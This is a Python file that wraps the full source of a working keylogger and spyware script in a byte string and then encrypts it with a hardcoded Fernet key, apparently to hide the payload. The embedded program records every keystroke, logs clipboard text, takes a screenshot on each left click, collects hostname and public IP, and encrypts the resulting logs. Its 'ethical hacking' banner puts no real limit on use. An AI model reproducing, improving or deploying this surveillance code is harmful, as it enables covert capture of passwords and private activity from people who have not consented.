from cryptography.fernet import Fernet

code = b"""

###
# The purpose of this program is:
# 1-To act as a keylogger
# 2-To capture a screenshot every time the left mouse-button is clicked,
# 3-To log the clipboard activity - But it will only copy text, no pictures.,
# 4-To log a bit of system info as well,
# 5-To encrypt all the logged reports above
# 6-To run each process seperately so they can all run together.
# The script will take 120 seconds to grab all information and encrypt it.
# To decrypt encrypted files run my "decrypter.py" file and ensure the "crypt.key" remains unchanged.
###




# The pynput module must be installed with pip.
from pynput.keyboard import Key
from pynput.keyboard import Listener as keyboard_Listener
from pynput import mouse

import socket
import platform
# The requests module must be installed with pip.
import requests

from datetime import datetime
import time

# The PIL module must be installed with pip. The module is called "pillow" to install with pip.
from PIL import ImageGrab

import tkinter
import tkinter.messagebox

import os
import shutil

from multiprocessing import Process

# The cryptography module must be installed with pip.
from cryptography.fernet import Fernet




### First we will assign some variables.

# All our logs & screenshots will be saved in the "directory" folder.

directory = os.getcwd()+"\log_files"

# The following variables define how our files will be named and stored.

sys_info_file = directory+"\sys-info.txt"
k_logger_file = directory+"\k-logger.txt"
cb_logger_file = directory+"\cb-logger.txt"
image_location = directory+"\screenshots"

### We need the following variables for the encryption process which will occur later.

keyFile=open("crypt.key", "rb")
encryption_key=keyFile.read()
keyFile.close()
fernet_key = Fernet(encryption_key)

### First and foremost we clean up any captured content from previous runs of this script and then create our directories fresh.

def clear_previous_instances():

    # If there is already a "directory" folder, we will delete it and it's contents before recreating it.
    # The "shutil.rmtree" allows us to delete a folder and all it's contents.
    # If there is not already a "directory" folder, we will create it.
    # Then we will create the "image_location" for the screenshots.

    if os.path.isdir(directory):
        shutil.rmtree(directory)
    os.makedirs(directory)
    os.makedirs(image_location)




### --ONE-- Here is the first function that we will perform: Get some system information!

def get_systeminfo():
    hostname = socket.gethostname()
    int_ip = socket.gethostbyname(hostname)
    try:
        pub_ip = requests.get('https://api.ipify.org').text
    except:
        pub_ip = "OFFLINE"

    sys = platform.system()
    ver = platform.version()

    open(sys_info_file, "w").write(f"The hostname is: {hostname}.\\nIt's private IP address is: {int_ip}.\\nIt's public IP address is: {pub_ip}\\nIt is running: {sys} {ver}\\nThe current local time is {datetime.now()}")




### --TWO-- Here is the second function we will perform: Screenshots taken by every mouse click!

def take_screenshot():

    # The mouse.Events() function captures ALL movement of the mouse.
    # We only want it of the left mouse-button is pressed. All exceptions will pass.
    # I want every screenshot to get it's own unique timestamp, which tells us when it was taken.

    with mouse.Events() as events:
        for event in events:
            try:
                if event.button == mouse.Button.left:
                    img=ImageGrab.grab()
                    screenshot_file = image_location+"\Screenshot @ " + datetime.now().strftime("%d-%m-%Y %H,%M,%S") + ".png"
                    img.save(screenshot_file)
                    encrypt_screenshots(screenshot_file)
            except:
                pass

# Every image will be encrypted immediately.

### NOTE: In order to decrypt encrypted files, you must use the same key that was used to encrypt the files!!!
# You can decrypt the images by running my "decrypter.py" file.

# 1) We read the image in "binary",
# 2) For an image, we have another step: we must convert the data to pure bytes. We do that with the bytes() function.
# 3) We encrypt the data using the key that we defined earlier.
    # The key is stored in a file called crypt.key
    # The key was generated by the python file "key_generator.py". You can run it to get a new key.
# 4) We overwrite the image data with the encrypted data.

def encrypt_screenshots(image):
    with open(image, "rb") as i:
        data = i.read()
        data = bytes(data)

    encrypted = fernet_key.encrypt(data)

    with open(image, "wb") as i:
        i.write(encrypted)




### --THREE-- This is the third function we will perform: Clipboard Logger!
# I used tkinter to access the clipboard because it comes pre-installed with python!
# All copied content will be added to a list and the list will be constantly updated.

t=tkinter.Tk()
clipboard=[]
t.withdraw()
def copy_clipboard():

    # Only text will be grabbed, anythong else will be handled by the error exception.
    # We start the function by grabbing content currently in the clipboard.
    # We will try to grab the clipboard contents if there are contents. If there are no contents, we will handle the error exception.

    try:
        clipboard.append(t.clipboard_get())
        write_cb_log(clipboard)
        text_already_pasted = t.clipboard_get()
        try_1=True
    except:
        text_already_pasted = ""
        try_1=True
    
    # We need a while loop to continue grabbing clipboard content but we don't want duplicates!
    # We assign a variable to what we already grabbed and then we continuously grab clipboard content with a while loop.
    # If there is new content, we grab it.
    # If there is an error, that means there is new content in the clipboard. 
    # (It returns an error since another program opened the clipboard, which forces tkinter to close the clipboard.)

    while try_1 == True:
        try:
            while text_already_pasted == t.clipboard_get():
                pass
            while text_already_pasted != t.clipboard_get():
                try:
                    clipboard.append(t.clipboard_get())
                    write_cb_log(clipboard)
                    text_already_pasted = t.clipboard_get()
                except:
                    pass
        except:
            try_2=True
            pass

    while try_2==True:
        try:
            while text_already_pasted == t.clipboard_get():
                pass
            while text_already_pasted != t.clipboard_get():
                try:
                    clipboard.append(t.clipboard_get())
                    write_cb_log(clipboard)
                    text_already_pasted = t.clipboard_get()
                except:
                    pass
        except:
            try_1=True
            pass

# Here we turn the list into a file.
# Every entry is written seperately.
# Every piece in our clipboard logger will be seperated.
def write_cb_log(clipboard):
    with open(cb_logger_file, "w") as cblog:
        for entry in clipboard:
            cblog.write(f"{entry}\\n---\\n") 




### --FOUR-- Our fourth function is the keylogger!
# This function might be our namesake, but it's almost the smallest function. 
# All captured keys will be entered into a list and the list will be repeatedly submitted into our "k_logger_file".

keys = []

# We start the keyboard listner thread. 
# We apply the argument for "on_press" to follow function "key_pressed".

def start_keylogger():
    with keyboard_Listener(on_press=key_pressed) as keyboard:
        keyboard.join()

# We append each captured "key" to our list of "keys".
# We then tell the script to run the function "write_file" with our "keys" list as it's argument.

def key_pressed(key):
    keys.append(key)
    write_file(keys)

# We write the "keys" list into our .txt document we defined earlier.
# We want the space keys to be written as actual spaces.
# We want the non-Unicode keys to be placed on a new line, so as not to clutter our text.

def write_file(keys):
    with open(k_logger_file, "w") as klog:
        for key in keys:
                if key == Key.space:
                    klog.write(" ")
                elif str(key).find("'") == -1:
                    klog.write(f"\\n{key}\\n")
                else:
                    klog.write(str(key).replace("'",""))




### --FIVE-- This is our fifth function - the encrypter!

### NOTE: In order to decrypt encrypted files, you must use the same key that was used to encrypt the files!!!
# You can decrypt the images by running my "decrypter.py" file.

# We first make a list listing all the files we want to encrypt.
# We use error handling just in case one of the files don't exist, we can continue with the others.
# 1) We read "each_file" in our "files_to_encrypt" list in "binary",
# 2) We encrypt the data using the key that we defined earlier.
    # The key is stored in a file called "crypt.key".
    # The key was generated by the python file "key_generator.py". You can run it to get a new key.
# 3) We overwrite each file's data with the encrypted data.

def encrypt_files():
    files_to_encrypt = [sys_info_file, cb_logger_file, k_logger_file]
    for each_file in files_to_encrypt:
        try:
            with open(each_file, "rb") as f:
                data = f.read()
                f.close()

            encrypted = fernet_key.encrypt(data)

            with open(each_file, "wb") as f:
                f.write(encrypted)
        except:
            pass




### This is showtime.
# Since the clipboard-logger, the keylogger, and the mouse-listner all are on-going functions, only the first of them that is called would work since each function in python only runs in order of when it's called.
# For that, we use the multiprocessing module that comes with python!
# Note: It seems that the way this works is that the script goes through once, and then again to start each process. So if you had a function that already ran, it will re-run a few times again!

# With the ".join()" function, we wait for the "clear_previous_instances" function to finish before starting the other processes.
# We allow all the processes to run for 120 seconds before terminating each one.
# The "get_systeminfo" function finshed on it's own so it doesn't need to get terminated.
# Subsequently, we run the process to encrypt all files.

if __name__ == '__main__':
    print("This is an Ethical Hacking program.")
    print("Your computer is now being observed.")
    p0 = Process(target = clear_previous_instances)
    p0.start()
    p0.join()
    p1 = Process(target = get_systeminfo)
    p1.start()
    p2 = Process(target = take_screenshot)
    p2.start()
    p3 = Process(target = copy_clipboard)
    p3.start()
    p4 = Process(target = start_keylogger)
    p4.start()
    time.sleep(120)
    p2.kill()
    p3.kill()
    p4.kill()
    p5 = Process(target = encrypt_files)
    p5.start()
    """

encryption_key= "AKQXJZDVl1bRAbM1tTlLp3a4VEHTQY0F8q5xuGpDEEk="
fernet_key = Fernet(encryption_key)

encrypted_script = fernet_key.encrypt(code)

with open("encrypted_program.txt", "wb") as f:
    f.write(encrypted_script)
    f.close()